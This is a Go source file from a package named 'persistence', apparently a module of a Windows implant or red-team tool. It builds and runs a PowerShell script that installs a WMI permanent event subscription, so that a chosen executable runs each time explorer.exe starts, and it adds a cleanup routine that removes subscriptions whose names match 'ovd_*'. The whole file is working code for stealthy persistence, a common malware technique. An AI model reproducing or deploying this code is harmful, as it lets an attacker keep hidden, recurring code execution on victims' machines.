//go:build windows && persist_wmi
// +build windows,persist_wmi

package persistence

import (
	"fmt"
	"strings"
)

func init() {
	persistInstallFn = installWMI
	persistUninstallFns = append(persistUninstallFns, uninstallWMI)
}

func installWMI(targetPath string) error {
	filterName, consumerName := deriveWMINames(targetPath)
	safe := strings.ReplaceAll(targetPath, "'", "''")
	script := fmt.Sprintf(
		`$f = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); `+
			`$f.QueryLanguage = 'WQL'; `+
			`$f.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 `+
			`WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"; `+
			`$f.Name = '%s'; $f.EventNameSpace = 'root\cimv2'; $null = $f.Put(); `+
			`$c = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); `+
			`$c.Name = '%s'; $c.ExecutablePath = '%s'; $null = $c.Put(); `+
			`$b = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance(); `+
			`$b.Filter = "\\.\root\subscription:__EventFilter.Name='%s'"; `+
			`$b.Consumer = "\\.\root\subscription:CommandLineEventConsumer.Name='%s'"; `+
			`$null = $b.Put()`,
		filterName, consumerName, safe, filterName, consumerName)
	return runPowerShell(script)
}

func uninstallWMI() error {
	return runPowerShell(
		`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding ` +
			`-ErrorAction SilentlyContinue | Where-Object { $_.Filter -like "*ovd_*" } | ` +
			`Remove-WmiObject -ErrorAction SilentlyContinue; ` +
			`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer ` +
			`-ErrorAction SilentlyContinue | Where-Object { $_.Name -like "ovd_*" } | ` +
			`Remove-WmiObject -ErrorAction SilentlyContinue; ` +
			`Get-WmiObject -Namespace root\subscription -Class __EventFilter ` +
			`-ErrorAction SilentlyContinue | Where-Object { $_.Name -like "ovd_*" } | ` +
			`Remove-WmiObject -ErrorAction SilentlyContinue`)
}
